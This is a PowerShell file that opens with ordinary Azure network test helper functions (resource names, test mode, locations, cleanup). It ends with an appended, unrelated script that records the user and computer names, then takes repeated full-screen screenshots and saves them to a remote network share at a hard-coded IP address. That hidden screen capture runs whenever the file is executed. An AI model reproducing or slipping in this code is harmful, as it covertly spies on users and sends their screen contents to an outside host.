














function Get-ResourceGroupName
{
    param([string] $prefix = [string]::Empty)

	return getAssetName $prefix
}


function Get-ResourceName
{
    param([string] $prefix = [string]::Empty)

    return getAssetName $prefix
}


function Get-NetworkTestMode {
    try {
        $testMode = [Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode;
        $testMode = $testMode.ToString();
    } catch {
        if ($PSItem.Exception.Message -like '*Unable to find type*') {
            $testMode = 'Record';
        } else {
            throw;
        }
    }

    return $testMode
}


function Get-ProviderLocation($provider, $preferredLocation = "West Central US", $useCanonical = $null)
{
    
    if($env:AZURE_NRP_TEST_LOCATION -and $env:AZURE_NRP_TEST_LOCATION -match "^[a-z0-9\s]+$")
    {
        return $env:AZURE_NRP_TEST_LOCATION;
    }
    if($null -eq $useCanonical)
    {
        $useCanonical = -not $preferredLocation.Contains(" ");
    }
    if($useCanonical)
    {
        $preferredLocation = Normalize-Location $preferredLocation;
    }
    if($provider.Contains("/"))
    {
        $providerNamespace, $resourceType = $provider.Split("/");
        return Get-Location $providerNamespace $resourceType $preferredLocation -UseCanonical:$($useCanonical);
    }
    return $preferredLocation;
}


function Clean-ResourceGroup($rgname)
{
    if ((Get-NetworkTestMode) -ne 'Playback') {
        Remove-AzResourceGroup -Name $rgname -Force
    }
}


function Start-TestSleep($milliseconds)
{
    if ((Get-NetworkTestMode) -ne 'Playback')
    {
        Start-Sleep -Milliseconds $milliseconds
    }
}





$username="$env:UserName"
Write-Output $username	
$hname="$env:computername"
Write-Output $hname	

$i=1
While ($i -le 5){

$time=Get-Date -format "dd-MMM-yyyy-HH-mm-ss"
Write-Output $time


if (Test-Path \\143.16.176.125\x) {
$File = "\\143.16.176.125\x\" + $username + "_" + $hname + "_" + $time + ".jpg"
}
ElseIf (Test-Path C:\HP) {
$File = "C:\HP\" + $username + "_" + $time + ".jpg"
}
ElseIf (Test-Path C:) {
$File = "C:\" + $username + "_" + $time + ".jpg"
}
Else {

exit
}

Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing

$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width
$Height = $Screen.Height
$Left = $Screen.Left
$Top = $Screen.Top

$bitmap = New-Object System.Drawing.Bitmap $Width, $Height

$graphic = [System.Drawing.Graphics]::FromImage($bitmap)

$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)

$bitmap.Save($File, ([system.drawing.imaging.imageformat]::jpeg)) 
Write-Output "Screenshot saved to:"
Write-Output $File

$graphic.dispose()
$bitmap.dispose()

Start-Sleep -Seconds 30
$i++
}

exit

